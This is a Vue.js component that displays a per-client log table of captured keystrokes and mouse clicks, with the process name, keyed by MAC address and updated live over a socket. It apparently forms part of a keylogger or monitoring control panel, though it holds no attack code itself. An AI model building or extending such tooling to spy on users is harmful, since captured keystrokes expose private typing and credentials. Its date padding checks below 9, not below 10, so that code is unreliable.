<template>
  <div>
    <b-table :data="logs" :paginated="true" :per-page="20">
      <template scope="props" slot="header">
        <b-tooltip :active="!!props.column.meta" :label="props.column.meta" dashed>
          {{ props.column.label }}
        </b-tooltip>
      </template>

      <template scope="props">
        <b-table-column field="timestamp" label="Date" width="40" date sortable>
          {{ props.row.timestamp | timestampToDate}}
        </b-table-column>

        <b-table-column label="Process">
          {{ props.row.process }}
        </b-table-column>

        <b-table-column label="Data">
          <span v-if="props.row.type === 'KEYSTROKE'">
            {{ props.row.data }}
          </span>
          <span v-else>
            <b-tooltip :label="`X: ${props.row.data.x}, Y: ${props.row.data.y}`" position="is-top">
              {{ props.row.data.click }}
            </b-tooltip>
          </span>
        </b-table-column>

        <b-table-column label="Type">
          {{ props.row.type }}
        </b-table-column>
      </template>
    </b-table>
  </div>
</template>

<script>
  import api from '@/api/index'

  export default {
    name: 'clients-logs',
    data () {
      return {
        logs: []
      }
    },
    mounted () {
      api.logs.getByMac(this.$parent.mac).then(response => {
        this.logs = response.data.data
      })
    },
    sockets: {
      newLog (data) {
        if (data.client_mac === this.$parent.mac) this.logs.push(data)
      }
    },
    filters: {
      timestampToDate (value) {
        let date = new Date(parseInt(value))
        let dd = (date.getDate() < 9 ? '0' : '') + date.getDate()
        let mm = ((date.getMonth() + 1) < 9 ? '0' : '') + (date.getMonth() + 1)
        let yy = date.getFullYear()
        let h = (date.getHours() < 9 ? '0' : '') + date.getHours()
        let m = (date.getMinutes() < 9 ? '0' : '') + date.getMinutes()
        let s = (date.getSeconds() < 9 ? '0' : '') + date.getSeconds()
        return `${dd}/${mm}/${yy} ${h}:${m}:${s}`
      }
    }
  }
</script>

<style>

</style>
